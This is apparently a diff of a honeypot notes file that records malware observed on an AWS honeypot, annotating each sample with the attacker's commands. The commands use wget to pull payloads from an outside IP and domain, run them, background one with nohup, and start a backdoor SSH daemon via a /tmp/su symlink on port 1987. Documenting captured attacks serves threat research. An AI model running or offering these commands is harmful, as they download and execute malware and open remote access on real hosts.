@@ -1,18 +1,22 @@
+Links to malware obtained via AWS honeypot. Included the commands ran after the malware was downloaded.
 
-# Links to malware obtained via AWS honeypot. Included the commands ran after the malware was downloaded.
-
+Do NOT enter any of these commands unless you know what you're doing
 
 syn.sh - wget http://58.218.66.85:12345/syn.sh 
+       - """Shell script used to download more malwares"""
 
 
 888    - wget http://58.218.66.85:12345/888
+       - """Binary file"""
 
 
 666    - wget http://58.218.66.85:12345/666
+       - """Binary file. Possibly a ssh tunnel?"""
        - ./666
        - ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=1987
 
 
 exp    - wget http://mdb7.cn:8081/exp 
+       - """Binary file"""
        - nohup /root/exp > /dev/null 2>&1 &
 
